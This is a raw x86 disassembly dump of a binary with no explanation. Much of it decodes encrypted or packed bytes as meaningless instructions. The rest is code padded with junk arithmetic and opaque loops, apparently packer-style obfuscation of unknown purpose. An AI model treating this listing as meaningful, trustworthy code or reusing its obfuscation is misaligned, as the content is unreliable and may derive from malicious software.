  4030a7:	dec    esp
  4030a8:	or     DWORD PTR [esi+0x18],0x5d
  4030ac:	ins    DWORD PTR es:[edi],dx
  4030ad:	cmp    DWORD PTR [esi-0x10095ae1],esp
  4030b3:	inc    edx
  4030b4:	outs   dx,DWORD PTR ds:[esi]
  4030b5:	jmp    0x4030cd
  4030b7:	xchg   DWORD PTR [ebp-0x2f248823],edi
  4030bd:	inc    eax
  4030be:	jno    0x40312a
  4030c0:	pushf  
  4030c1:	rcl    BYTE PTR [edx-0x65],1
  4030c4:	out    dx,eax
  4030c5:	into   
  4030c6:	dec    edx
  4030c7:	pop    edi
  4030c8:	sub    eax,0x80f57838
  4030cd:	cmp    al,0xd3
  4030cf:	fwait
  4030d0:	push   edx
  4030d1:	cmc    
  4030d2:	imul   ebx,DWORD PTR [ecx-0x3da2ff32],0x26d9b8d6
  4030dc:	out    0x7b,al
  4030de:	nop
  4030df:	std    
  4030e0:	cmp    BYTE PTR [esi+0x75],ah
  4030e3:	xchg   BYTE PTR gs:0x4a093c57,ah
  4030ea:	fldcw  WORD PTR [edi+0x15b4fcbc]
  4030f0:	dec    ecx
  4030f1:	xor    al,0x67
  4030f3:	mov    eax,esi
  4030f5:	addr16 jo 0x40315b
  4030f8:	mov    dh,dl
  4030fa:	jns    0x403149
  4030fc:	stc    
  4030fd:	repnz cmc 
  4030ff:	mov    ebx,0x7e31863b
  403104:	lock inc esp
  403106:	test   BYTE PTR [ebx+0x64853b90],0xf5
  40310d:	pop    eax
  40310e:	pushf  
  40310f:	fdivr  QWORD PTR [ebx-0x5d]
  403112:	ins    BYTE PTR es:[edi],dx
  403113:	adc    BYTE PTR [eax],dl
  403115:	push   ecx
  403116:	les    eax,FWORD PTR [ebp-0x52]
  403119:	stos   BYTE PTR es:[edi],al
  40311a:	test   al,0x4e
  40311c:	repnz pop ecx
  40311e:	push   ebp
  40311f:	mov    al,0x4d
  403121:	mov    ebx,0xa1483d5d
  403126:	dec    ebp
  403127:	imul   ebp,eax,0x2b
  40312a:	daa    
  40312b:	shl    DWORD PTR [edi],1
  40312d:	arpl   WORD PTR [eax],cx
  40312f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403130:	mov    al,0x26
  403132:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403133:	jl     0x403138
  403135:	arpl   di,si
  403137:	addr16 sti 
  403139:	outs   dx,BYTE PTR ds:[esi]
  40313a:	jl     0x4031a9
  40313c:	cmp    ah,BYTE PTR [ecx]
  40313e:	into   
  40313f:	xchg   ecx,eax
  403140:	push   ebp
  403141:	jb     0x40319e
  403143:	leave  
  403144:	dec    ebx
  403145:	push   esi
  403146:	sbb    al,BYTE PTR cs:[ecx+esi*8-0x7e]
  40314b:	mov    DWORD PTR [edx+eiz*8+0x7f],edi
  40314f:	iret   
  403150:	push   cs
  403151:	add    cl,BYTE PTR [edx+ebx*2+0x26]
  403155:	jo     0x403177
  403157:	fwait
  403158:	sub    BYTE PTR [eax-0x3e5796e9],0x47
  40315f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403160:	out    0xbc,eax
  403162:	sahf   
  403163:	jb     0x4031bd
  403165:	cmp    eax,0x776fe95c
  40316a:	shr    BYTE PTR [ecx-0x2f],cl
  40316d:	xor    ebp,DWORD PTR [ecx-0x6f536c8]
  403173:	jnp    0x40316e
  403175:	sub    esp,DWORD PTR [ecx+0x58]
  403178:	stc    
  403179:	jbe    0x4031cf
  40317b:	push   ecx
  40317c:	loope  0x403126
  40317e:	jmp    0x403166
  403180:	add    dh,BYTE PTR [ebp-0x61b725a5]
  403186:	and    al,0xdf
  403188:	and    DWORD PTR [ebx-0x26],0x26
  40318c:	out    dx,eax
  40318d:	xchg   ebp,eax
  40318e:	and    eax,0x9a9081e1
  403193:	adc    esp,DWORD PTR [edi-0x6155f4fc]
  403199:	pusha  
  40319a:	mov    esp,ebx
  40319c:	push   ds
  40319d:	sahf   
  40319e:	shl    BYTE PTR [edx+0x16b0f6b0],0xdd
  4031a5:	test   eax,0x435c2433
  4031aa:	fwait
  4031ab:	and    BYTE PTR [eax],dh
  4031ad:	(bad)  
  4031ae:	mov    edi,0xd833875a
  4031b3:	sbb    al,0xfc
  4031b5:	out    0x5e,al
  4031b7:	xchg   esp,eax
  4031b8:	sbb    DWORD PTR [eax-0x5e],ecx
  4031bb:	and    esp,DWORD PTR [edx+edi*2]
  4031be:	retf   0x539e
  4031c1:	daa    
  4031c2:	sbb    DWORD PTR [ebp+0x4e],edi
  4031c5:	fwait
  4031c6:	stc    
  4031c7:	and    al,0x19
  4031c9:	outs   dx,BYTE PTR ds:[esi]
  4031ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031cb:	mov    bh,0x46
  4031cd:	das    
  4031ce:	push   esp
  4031cf:	sbb    ebp,DWORD PTR [esi]
  4031d1:	jp     0x4031da
  4031d3:	pop    edx
  4031d4:	jns    0x403210
  4031d6:	mov    edi,0xce2d8946
  4031db:	dec    esp
  4031dc:	and    ebp,ebx
  4031de:	or     ch,BYTE PTR [edx]
  4031e0:	jg     0x40318e
  4031e2:	mov    eax,0x6472c195
  4031e7:	and    dl,BYTE PTR [edx-0x5afb0934]
  4031ed:	call   0xe798b4a5
  4031f2:	mov    esi,0xad72a292
  4031f7:	adc    al,BYTE PTR [ebp+0x17]
  4031fa:	inc    edx
  4031fb:	xchg   ebx,eax
  4031fc:	pop    edx
  4031fd:	jmp    0x95976086
  403202:	sbb    edi,DWORD PTR [ebx]
  403204:	jecxz  0x403271
  403206:	lea    esi,[eax]
  403208:	in     eax,dx
  403209:	adc    ebp,ebx
  40320b:	inc    esi
  40320c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40320d:	dec    ebp
  40320e:	mov    ds:0x23297f7e,eax
  403213:	jp     0x4031a3
  403215:	or     eax,0xfae04422
  40321a:	frstor [ecx-0x4]
  40321d:	sub    eax,0xbca3b3c9
  403222:	adc    al,0x4a
  403224:	push   ecx
  403225:	inc    edx
  403226:	dec    eax
  403227:	cwde   
  403228:	imul   ebp,edx,0x47
  40322b:	jg     0x403287
  40322d:	mov    es,WORD PTR [edi-0x29]
  403230:	sahf   
  403231:	call   0x1db7:0xeabf9ea9
  403238:	add    BYTE PTR [edi],bh
  40323a:	mov    DWORD PTR [ebp+ecx*1-0x67],ecx
  40323e:	and    eax,0xab5895af
  403243:	stc    
  403244:	icebp  
  403245:	clc    
  403246:	mov    esi,0x9129a4be
  40324b:	aas    
  40324c:	fdivr  DWORD PTR [esi]
  40324e:	cmp    al,0xb5
  403250:	xor    ch,BYTE PTR [edx-0x80]
  403253:	mov    edx,0x696966de
  403258:	mov    edx,0x60d211d0
  40325d:	les    edx,FWORD PTR [ecx+0x26]
  403260:	mov    dl,0xf
  403262:	push   edi
  403263:	mov    DWORD PTR [edi+0x42],eax
  403266:	or     DWORD PTR [esi],esi
  403268:	(bad)  
  40326a:	xchg   edx,eax
  40326b:	push   ds
  40326c:	ja     0x403286
  40326e:	call   0xbdcc:0x4114bae5
  403275:	dec    ebp
  403276:	pop    esi
  403277:	shr    DWORD PTR ds:0x59a7680a,1
  40327d:	push   esi
  40327e:	cmp    al,0xe1
  403280:	xchg   BYTE PTR [ecx],bl
  403282:	lods   eax,DWORD PTR ds:[esi]
  403283:	and    al,0x4a
  403285:	mov    ch,0xa3
  403287:	fcmovne st,st(7)
  403289:	or     ebx,DWORD PTR [ebx]
  40328b:	cmc    
  40328c:	imul   eax,eax,0x2d
  40328f:	fcom   QWORD PTR [edi+edx*1]
  403292:	inc    esi
  403293:	jl     0x403296
  403295:	add    DWORD PTR [eax+0x42],ebx
  403298:	int3   
  403299:	mov    ah,0x1d
  40329b:	add    BYTE PTR [ebx+0x7c5e83f0],bh
  4032a1:	cmp    eax,DWORD PTR [esi+ecx*2+0x6dfe6e15]
  4032a8:	iret   
  4032a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032aa:	jge    0x40328e
  4032ac:	hlt    
  4032ad:	sbb    BYTE PTR [ecx-0x72],dh
  4032b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032b1:	push   ebp
  4032b2:	xchg   ecx,eax
  4032b3:	or     esi,0x56bfc82f
  4032b9:	pop    esp
  4032ba:	and    eax,0x4aab38d9
  4032bf:	xor    al,0x12
  4032c1:	out    dx,al
  4032c2:	or     BYTE PTR ds:0x77d59736,dl
  4032c8:	(bad)  
  4032c9:	ficom  WORD PTR [ebx+esi*4]
  4032cc:	test   al,0xf2
  4032ce:	mov    ch,0x21
  4032d0:	sub    eax,0xf2f5cec0
  4032d5:	cdq    
  4032d6:	sbb    DWORD PTR [ecx-0x3243ab15],ebp
  4032dc:	out    0x58,eax
  4032de:	daa    
  4032df:	inc    ebx
  4032e0:	and    ch,dh
  4032e2:	push   esp
  4032e3:	jmp    0x403311
  4032e5:	pushf  
  4032e6:	xor    eax,0x54ffc35d
  4032eb:	xlat   BYTE PTR ds:[ebx]
  4032ec:	out    dx,al
  4032ed:	retf   0xb274
  4032f0:	mov    ds:0x349f188c,eax
  4032f5:	cmp    eax,0x5b351147
  4032fa:	retf   0x6f28
  4032fd:	fistp  WORD PTR [ebp+0x3cb06a5b]
  403303:	scas   al,BYTE PTR es:[edi]
  403304:	stos   BYTE PTR es:[edi],al
  403305:	pop    eax
  403306:	ja     0x403378
  403308:	push   ecx
  403309:	scas   al,BYTE PTR es:[edi]
  40330a:	(bad)  
  40330b:	scas   al,BYTE PTR es:[edi]
  40330c:	xchg   ebp,eax
  40330d:	test   DWORD PTR [edx],ecx
  40330f:	mov    ecx,DWORD PTR [esi]
  403311:	arpl   WORD PTR [esi-0x4c97a570],bx
  403317:	sbb    DWORD PTR [esi+ecx*4+0x6f],ecx
  40331b:	pause  
  40331d:	test   al,0xf1
  40331f:	dec    ebx
  403320:	ja     0x4032de
  403322:	idiv   dh
  403324:	mov    eax,DWORD PTR [esp+eax*4+0x6f]
  403328:	scas   eax,DWORD PTR es:[edi]
  403329:	push   0x24bbe3be
  40332e:	sbb    eax,0x6863469b
  403333:	inc    edi
  403334:	add    eax,0x86d0ef02
  403339:	ret    
  40333a:	jle    0x40335f
  40333c:	xchg   esp,eax
  40333d:	pop    eax
  40333e:	xchg   ebp,eax
  40333f:	push   es
  403340:	jmp    0xb11f:0xda9aeb40
  403347:	aas    
  403348:	add    BYTE PTR ds:0x69a1be2b,ah
  40334e:	rol    edi,0x6e
  403351:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403352:	jb     0x40338f
  403354:	cmp    DWORD PTR [ebx],ebp
  403356:	jno    0x4033ab
  403358:	cmp    al,0x97
  40335a:	outs   dx,DWORD PTR ds:[esi]
  40335b:	sub    BYTE PTR [ebp+0x4b],bh
  40335e:	daa    
  40335f:	jbe    0x403317
  403361:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403362:	enter  0xcf48,0xb
  403366:	xor    eax,0xa0f8586d
  40336b:	xchg   ebp,eax
  40336c:	push   edx
  40336d:	lea    ecx,[eax+ecx*8-0x14f8e9af]
  403374:	jp     0x403383
  403376:	jge    0x403308
  403378:	je     0x403315
  40337a:	aam    0x98
  40337c:	stos   DWORD PTR es:[edi],eax
  40337d:	aas    
  40337e:	mov    WORD PTR [esi+0x56],ds
  403381:	jnp    0x4033c8
  403383:	mov    eax,DWORD PTR [edx]
  403385:	leave  
  403386:	inc    eax
  403387:	add    al,0x55
  403389:	aaa    
  40338a:	sub    DWORD PTR [ecx],0xffffff9c
  40338d:	dec    esp
  40338e:	jmp    FWORD PTR [ebx]
  403390:	dec    esp
  403391:	loopne 0x4033a4
  403393:	xchg   esi,eax
  403394:	std    
  403395:	or     ah,BYTE PTR [eax+0x2cee7a8c]
  40339b:	mov    bh,0x4e
  40339d:	mov    BYTE PTR [ebx-0x2b35ea34],al
  4033a3:	sbb    al,0x34
  4033a5:	xchg   edx,eax
  4033a6:	jne    0x403342
  4033a8:	push   esi
  4033a9:	test   eax,0xeeeae02
  4033ae:	mov    eax,0xfcd7406b
  4033b3:	loope  0x4033f6
  4033b5:	pop    eax
  4033b6:	test   DWORD PTR [edx-0x51],ebp
  4033b9:	xor    eax,0x41caa997
  4033be:	jg     0x403425
  4033c0:	std    
  4033c1:	jmp    0x8ece:0xa538b141
  4033c8:	and    eax,0x117e8975
  4033cd:	inc    edi
  4033ce:	mov    edi,0xf345a8b8
  4033d3:	aaa    
  4033d4:	or     BYTE PTR [eax],ch
  4033d6:	dec    ebp
  4033d7:	jae    0x403443
  4033d9:	loope  0x4033b9
  4033db:	rol    BYTE PTR [esi+0x55],cl
  4033de:	mov    al,ds:0xf7dafe27
  4033e3:	scas   al,BYTE PTR es:[edi]
  4033e4:	pop    es
  4033e5:	and    al,0x4b
  4033e7:	and    al,0xbd
  4033e9:	dec    esp
  4033ea:	addr16 je 0x403388
  4033ed:	xchg   esp,eax
  4033ee:	rcr    BYTE PTR [ebx-0x7c],cl
  4033f1:	(bad)  
  4033f2:	aas    
  4033f3:	icebp  
  4033f4:	dec    ecx
  4033f5:	data16 lods al,BYTE PTR ds:[esi]
  4033f7:	jb     0x4033fe
  4033f9:	imul   edx,eax,0xffffffad
  4033fc:	xor    BYTE PTR [edi+0x72],cl
  4033ff:	cmc    
  403400:	in     eax,dx
  403401:	push   ds
  403402:	and    eax,0x228682d2
  403407:	loop   0x4033b5
  403409:	lods   al,BYTE PTR ds:[esi]
  40340a:	cmp    dh,dh
  40340c:	xchg   edx,eax
  40340d:	sub    BYTE PTR [esi-0x63],dh
  403410:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403411:	lock mov dh,0xc1
  403414:	mov    ch,0x62
  403416:	loope  0x403487
  403418:	hlt    
  403419:	jmp    0x3d7cfaf4
  40341e:	cs inc esi
  403420:	lock retf 
  403422:	retf   0x94a0
  403425:	xor    dh,BYTE PTR [esi-0x6331420]
  40342b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40342c:	leave  
  40342d:	popf   
  40342e:	(bad)  
  40342f:	mov    al,0x3c
  403431:	hlt    
  403432:	push   ebx
  403433:	jno    0x403427
  403435:	jnp    0x40349a
  403437:	js     0x4034b2
  403439:	outs   dx,BYTE PTR ds:[esi]
  40343a:	retf   0xf49a
  40343d:	dec    ecx
  40343e:	mov    bl,0xf7
  403440:	sub    eax,0xa4fa5096
  403445:	lea    edi,[ebx+0x4017ba7]
  40344b:	mov    esp,DWORD PTR [ecx-0x528a9672]
  403451:	pusha  
  403452:	mov    edx,0x64b5fc74
  403457:	jle    0x403476
  403459:	push   ss
  40345a:	xor    eax,0xe518f62a
  40345f:	mov    esp,0x723c21b5
  403464:	es (bad) 
  403466:	repz enter 0x538d,0xb9
  40346b:	ja     0x403468
  40346d:	into   
  40346e:	inc    eax
  40346f:	xchg   BYTE PTR [edi],ah
  403471:	or     DWORD PTR [ebx],ebp
  403473:	test   eax,0x99170670
  403478:	push   esi
  403479:	xchg   ecx,eax
  40347a:	xor    esp,DWORD PTR [ebp-0x6a94d84b]
  403480:	aam    0xe4
  403482:	xchg   ebx,eax
  403483:	das    
  403484:	imul   ebp,DWORD PTR [ecx+ebx*4+0x3b],0x6f5be335
  40348c:	jle    0x40349a
  40348e:	mov    edx,0xf4ce9086
  403493:	mov    WORD PTR [edx-0x14],ds
  403496:	mov    BYTE PTR [edi-0x5739de0f],0x35
  40349d:	aam    0x80
  40349f:	jecxz  0x4034c2
  4034a1:	xor    eax,0xd23e014f
  4034a6:	(bad)  
  4034a7:	int    0x12
  4034a9:	inc    edi
  4034aa:	or     DWORD PTR [ecx],0xa
  4034ad:	std    
  4034ae:	mov    es,ecx
  4034b0:	aaa    
  4034b1:	lahf   
  4034b2:	inc    ebp
  4034b3:	imul   edi,DWORD PTR ds:0xd4ddd5c5,0xf306071e
  4034bd:	(bad)  
  4034bf:	or     al,0x24
  4034c1:	gs pop eax
  4034c3:	sbb    eax,0xe553db3b
  4034c8:	rcr    edx,cl
  4034ca:	cmp    dh,BYTE PTR [ebp+0x2338aecc]
  4034d0:	stc    
  4034d1:	jp     0x403510
  4034d3:	shl    DWORD PTR [ebx-0x32],1
  4034d6:	and    edi,esi
  4034d8:	inc    ebx
  4034d9:	jo     0x4034e4
  4034db:	cmp    al,0x79
  4034dd:	xchg   ecx,eax
  4034de:	adc    al,0x5e
  4034e0:	mov    eax,ds
  4034e2:	aas    
  4034e3:	mov    WORD PTR [edi+0x1a86a86d],?
  4034e9:	mov    ds:0x1b9cc038,al
  4034ee:	pop    esi
  4034ef:	(bad)  
  4034f0:	out    dx,eax
  4034f1:	mov    esp,0xe824658f
  4034f6:	cld    
  4034f7:	lds    esi,FWORD PTR [ecx+0x63]
  4034fa:	push   DWORD PTR [ecx]
  4034fc:	xchg   esi,eax
  4034fd:	cld    
  4034fe:	or     eax,ebx
  403500:	scas   al,BYTE PTR es:[edi]
  403501:	ss xchg ecx,eax
  403503:	fsubr  st,st(2)
  403505:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403506:	ret    
  403507:	xchg   edx,eax
  403508:	push   ebx
  403509:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40350a:	xor    eax,0x1047ce23
  40350f:	adc    cl,BYTE PTR [ecx+0x7d]
  403512:	dec    esp
  403513:	xchg   esi,eax
  403514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403515:	xchg   DWORD PTR [bx+0x42],ebx
  403519:	(bad)  
  40351a:	pop    esp
  40351b:	mov    esp,0xf32c8b24
  403520:	and    ecx,ebp
  403522:	enter  0xf759,0x93
  403526:	mov    dh,0x1a
  403528:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403529:	out    0xce,eax
  40352b:	fadd   QWORD PTR [ebx+0x31]
  40352e:	pop    esp
  40352f:	aam    0x76
  403531:	pop    edi
  403532:	lds    eax,FWORD PTR [eax+eax*1+0x28]
  403536:	aas    
  403537:	lahf   
  403538:	dec    esp
  403539:	loope  0x4035a0
  40353b:	(bad)  
  40353c:	jge    0x403551
  40353e:	repnz mov cs,WORD PTR [edx+eiz*1+0x30]
  403543:	jecxz  0x40353f
  403545:	imul   esi,DWORD PTR [eax-0x495274d3],0xd576dcae
  40354f:	mov    ah,0xeb
  403551:	mov    bh,0x92
  403553:	mov    ah,0x87
  403555:	ror    DWORD PTR cs:[esi+edi*4],cl
  403559:	fld    QWORD PTR [edx+ecx*2+0x2a]
  40355d:	sbb    DWORD PTR [esi+0x4e499ba8],edi
  403563:	cwde   
  403564:	and    eax,esp
  403566:	clc    
  403567:	mov    ss,ecx
  403569:	push   cs
  40356a:	js     0x4034ed
  40356c:	xlat   BYTE PTR ds:[ebx]
  40356d:	scas   eax,DWORD PTR es:[edi]
  40356e:	mov    dh,0x1d
  403570:	(bad)  
  403571:	into   
  403572:	ja     0x403529
  403574:	stos   BYTE PTR es:[edi],al
  403575:	in     eax,dx
  403576:	cld    
  403577:	mov    ds:0x4f957fa5,al
  40357c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40357d:	cs js  0x403500
  403580:	push   eax
  403581:	push   ebp
  403582:	(bad)  
  403583:	out    dx,al
  403584:	add    BYTE PTR [ecx],bh
  403586:	inc    ebp
  403587:	pop    esi
  403588:	inc    esp
  403589:	ds gs popa 
  40358c:	call   0xa63983c3
  403591:	fldl2t 
  403593:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403594:	jp     0x4035b8
  403596:	sub    eax,0x177ffce5
  40359b:	sub    DWORD PTR [edi-0x28],esi
  40359e:	mov    esp,0x332923d9
  4035a3:	mov    ah,0xaf
  4035a5:	ror    DWORD PTR ds:0x377e54a5,cl
  4035ab:	push   ebx
  4035ac:	jno    0x403581
  4035ae:	add    al,0x94
  4035b1:	repnz lods al,BYTE PTR ds:[esi]
  4035b3:	push   edi
  4035b4:	xor    ebp,DWORD PTR [eax-0x7f]
  4035b7:	mov    eax,0x357ac2b5
  4035bc:	imul   ecx,esi,0xffffffe4
  4035bf:	fidivr WORD PTR [eax+0x69]
  4035c2:	call   0x2e1fd41d
  4035c7:	add    ecx,DWORD PTR [edx-0xc]
  4035ca:	pop    ds
  4035cb:	sahf   
  4035cc:	dec    edi
  4035cd:	outs   dx,BYTE PTR ds:[esi]
  4035ce:	adc    bl,BYTE PTR [ecx]
  4035d0:	ja     0x40356e
  4035d2:	mov    bl,0x2e
  4035d4:	fwait
  4035d5:	out    0xb8,al
  4035d7:	jno    0x4035fd
  4035d9:	dec    ebx
  4035da:	or     DWORD PTR [eax+edx*2+0x72],esp
  4035de:	ins    BYTE PTR es:[edi],dx
  4035df:	jbe    0x4035df
  4035e1:	jle    0x403636
  4035e3:	cmp    eax,0x75101310
  4035e8:	test   bh,ah
  4035ea:	cmp    al,BYTE PTR [esi+0x68e0c6d]
  4035f0:	iret   
  4035f1:	in     eax,dx
  4035f2:	(bad)  
  4035f3:	(bad)  
  4035f4:	fwait
  4035f5:	sub    ah,bh
  4035f7:	retf   0xe963
  4035fa:	repz pop ebx
  4035fc:	leave  
  4035fd:	mov    eax,0x24ad9be1
  403602:	fcomp  QWORD PTR [ecx]
  403604:	iret   
  403605:	or     ah,BYTE PTR ds:0xcc23efb5
  40360b:	inc    ebx
  40360c:	mov    edx,0xd2b083b0
  403611:	daa    
  403612:	stos   DWORD PTR es:[edi],eax
  403613:	pop    ebp
  403614:	jae    0x4035b2
  403616:	retf   0x24a2
  403619:	push   0xff64fa94
  40361e:	aaa    
  40361f:	sbb    esp,DWORD PTR [edx]
  403621:	test   dh,ch
  403623:	jno    0x403675
  403625:	fdiv   QWORD PTR [edi+ebx*2+0x1d4e8a11]
  40362c:	push   ebp
  40362d:	pop    ebx
  40362e:	imul   ecx,DWORD PTR [ecx-0x7a3817b3],0x60
  403635:	(bad)  
  403636:	(bad)  
  403637:	(bad)  
  403638:	mov    esp,0xa1f89c85
  40363d:	and    al,0x90
  40363f:	inc    edx
  403640:	add    BYTE PTR [ecx],al
  403642:	add    eax,0x42a014
  403647:	mov    eax,DWORD PTR [ebp-0x14]
  40364a:	mov    DWORD PTR [ebp-0x9c],eax
  403650:	adc    eax,0x5b9f
  403655:	mov    eax,DWORD PTR [ebp-0x18]
  403658:	sbb    DWORD PTR ds:0x42d004,0x42c01c
  403662:	mov    DWORD PTR [ebp-0x98],eax
  403668:	mov    eax,DWORD PTR [ebp-0x2c]
  40366b:	sub    DWORD PTR ds:0x429004,0x429014
  403675:	xor    eax,esi
  403677:	sub    DWORD PTR ds:0x429000,0x42c014
  403681:	add    eax,edi
  403683:	mov    DWORD PTR [ebp-0x94],eax
  403689:	lea    eax,[ebp-0x48]
  40368c:	mov    DWORD PTR [ebp-0x90],eax
  403692:	mov    eax,DWORD PTR [ebp-0xa0]
  403698:	xor    eax,esi
  40369a:	sbb    DWORD PTR ds:0x42a014,0x429000
  4036a4:	add    eax,edi
  4036a6:	sbb    DWORD PTR ds:0x42d010,0x42c00c
  4036b0:	mov    DWORD PTR [ebp-0xa0],eax
  4036b6:	xor    DWORD PTR ds:0x42a010,0x42901c
  4036c0:	lea    eax,[ebp-0xa0]
  4036c6:	push   eax
  4036c7:	sub    DWORD PTR ds:0x42d008,ebx
  4036cd:	mov    eax,DWORD PTR [ebp+0xc]
  4036d0:	or     DWORD PTR ds:0x42d01c,0x42a01c
  4036da:	xor    eax,esi
  4036dc:	xor    DWORD PTR ds:0x429000,0x42c018
  4036e6:	add    eax,edi
  4036e8:	xor    DWORD PTR ds:0x42a008,0x7741
  4036f2:	push   eax
  4036f3:	xor    eax,eax
  4036f5:	or     eax,DWORD PTR ds:0x42901c
  4036fb:	adc    DWORD PTR ds:0x42a00c,eax
  403701:	mov    eax,ds:0x42f38b
  403706:	push   0x42f2e1
  40370b:	add    DWORD PTR ds:0x429004,0x6a27
  403715:	push   DWORD PTR [eax]
  403717:	sub    DWORD PTR ds:0x429004,0x42d008
  403721:	call   0x40cc14
  403726:	and    ecx,0x7055
  40372c:	mov    ebx,DWORD PTR [ebp-0x14]
  40372f:	mov    DWORD PTR ds:0x42b008,0x1f
  403739:	cmp    DWORD PTR ds:0x42b008,0x0
  403740:	je     0x403790
  403746:	cmp    DWORD PTR ds:0x42b008,0x10
  40374d:	jbe    0x403790
  403753:	jmp    0x403764
  403758:	push   DWORD PTR [ebp-0x18]
  40375b:	push   DWORD PTR [ebp-0xc]
  40375e:	call   DWORD PTR ds:0x43002b
  403764:	cmp    DWORD PTR ds:0x42b008,0x11
  40376b:	jne    0x40377e
  403771:	mov    ecx,DWORD PTR ds:0x42b008
  403777:	dec    ecx
  403778:	mov    DWORD PTR ds:0x42b008,ecx
  40377e:	mov    ecx,DWORD PTR ds:0x42b008
  403784:	dec    ecx
  403785:	mov    DWORD PTR ds:0x42b008,ecx
  40378b:	jmp    0x403739
  403790:	mov    eax,DWORD PTR [ebp-0x18]
  403793:	mov    DWORD PTR [ebp-0x58],eax
  403796:	mov    DWORD PTR [ebp-0x34],0xf89c8533
  40379d:	mov    ecx,0xf89c85b1
  4037a2:	mov    edx,DWORD PTR ds:0x424ae5
  4037a8:	mov    edx,DWORD PTR [edx]
  4037aa:	sbb    DWORD PTR ds:0x42c00c,edx
  4037b0:	mov    DWORD PTR [ebp-0x1c],ecx
  4037b3:	lea    eax,[ecx-0x1]
  4037b6:	or     DWORD PTR ds:0x42d014,ebx
  4037bc:	mov    DWORD PTR [ebp-0x28],eax
  4037bf:	movzx  edx,WORD PTR ds:0x42a000
  4037c6:	sub    DWORD PTR ds:0x42b018,edx
  4037cc:	mov    DWORD PTR [ebp-0x10],ecx
  4037cf:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  4037d6:	add    DWORD PTR ds:0x42c014,0x7fdd
  4037e0:	mov    ecx,DWORD PTR [ebp-0x10]
  4037e3:	xor    ecx,esi
  4037e5:	mov    edx,0xffcd8d94
  4037ea:	sub    edx,ecx
  4037ec:	mov    ecx,0x1367
  4037f1:	mov    DWORD PTR [ebp-0xc],edx
  4037f4:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  4037fb:	mov    ecx,DWORD PTR [ebp-0x8]
  4037fe:	mov    DWORD PTR [ebp-0x3c],ebx
  403801:	cmp    ecx,eax
  403803:	je     0x405f34
  403809:	mov    eax,DWORD PTR [ebp-0x10]
  40380c:	xor    DWORD PTR ds:0x42901c,edi
  403812:	mov    ecx,DWORD PTR [ebp-0x10]
  403815:	xor    eax,esi
  403817:	add    DWORD PTR ds:0x42b014,0x42901c
  403821:	xor    ecx,esi
  403823:	add    DWORD PTR ds:0x429000,0x42c010
  40382d:	lea    ecx,[eax+ecx*1+0x64e5d8]
  403834:	mov    eax,DWORD PTR [ebp-0xc]
  403837:	dec    DWORD PTR ds:0x42c004
  40383d:	xor    edx,edx
  40383f:	sub    DWORD PTR ds:0x429008,0x6755
  403849:	div    ecx
  40384b:	dec    ecx
  40384c:	mov    eax,DWORD PTR [ebp-0x8]
  40384f:	add    DWORD PTR ds:0x429018,ecx
  403855:	mov    ecx,DWORD PTR [ebp-0x10]
  403858:	xor    eax,esi
  40385a:	adc    DWORD PTR ds:0x42d000,0x42a010
  403864:	xor    ecx,esi
  403866:	add    DWORD PTR ds:0x42900c,0x1115
  403870:	sub    eax,ecx
  403872:	mov    DWORD PTR ds:0x429020,0x13e
  40387c:	cmp    edx,eax
  40387e:	jne    0x405e79
  403884:	add    DWORD PTR ds:0x42b000,0x4efc
  40388e:	mov    eax,DWORD PTR [ebp-0xc]
  403891:	and    DWORD PTR ds:0x42b004,0x0
  40389b:	mov    ecx,DWORD PTR ds:0x42b004
  4038a1:	inc    ecx
  4038a2:	mov    DWORD PTR ds:0x42b004,ecx
  4038a8:	cmp    DWORD PTR ds:0x42b004,0x8
  4038af:	jle    0x4038f6
  4038b5:	jmp    0x4038cf
  4038ba:	push   0x1152
  4038bf:	push   0x42c014
  4038c4:	push   0x42f035
  4038c9:	call   DWORD PTR ds:0x430033
  4038cf:	cmp    DWORD PTR ds:0x42b004,0x7
  4038d6:	jne    0x4038e9
  4038dc:	mov    ecx,DWORD PTR ds:0x42b004
  4038e2:	inc    ecx
  4038e3:	mov    DWORD PTR ds:0x42b004,ecx
  4038e9:	cmp    DWORD PTR ds:0x42b004,0x16
  4038f0:	jb     0x40389b
  4038f6:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  4038fd:	movzx  eax,WORD PTR ds:0x42a010
  403904:	adc    eax,DWORD PTR ds:0x42a000
  40390a:	mov    ds:0x42a010,eax
  40390f:	mov    eax,DWORD PTR [ebp-0x28]
  403912:	mov    DWORD PTR ds:0x42a01c,0x1c
  40391c:	cmp    DWORD PTR ds:0x42a01c,0x0
  403923:	je     0x403973
  403929:	cmp    DWORD PTR ds:0x42a01c,0xa
  403930:	jg     0x403973
  403936:	jmp    0x403947
  40393b:	push   DWORD PTR [ebp-0x18]
  40393e:	push   DWORD PTR [ebp-0x24]
  403941:	call   DWORD PTR ds:0x430037
  403947:	cmp    DWORD PTR ds:0x42a01c,0xb
  40394e:	jne    0x403961
  403954:	mov    ecx,DWORD PTR ds:0x42a01c
  40395a:	dec    ecx
  40395b:	mov    DWORD PTR ds:0x42a01c,ecx
  403961:	mov    ecx,DWORD PTR ds:0x42a01c
  403967:	dec    ecx
  403968:	mov    DWORD PTR ds:0x42a01c,ecx
  40396e:	jmp    0x40391c
  403973:	mov    ecx,DWORD PTR [ebp-0x18]
  403976:	xor    eax,esi
  403978:	xor    ecx,esi
  40397a:	add    eax,edi
  40397c:	sbb    DWORD PTR ds:0x42b018,0x7aac
  403986:	add    ecx,edi
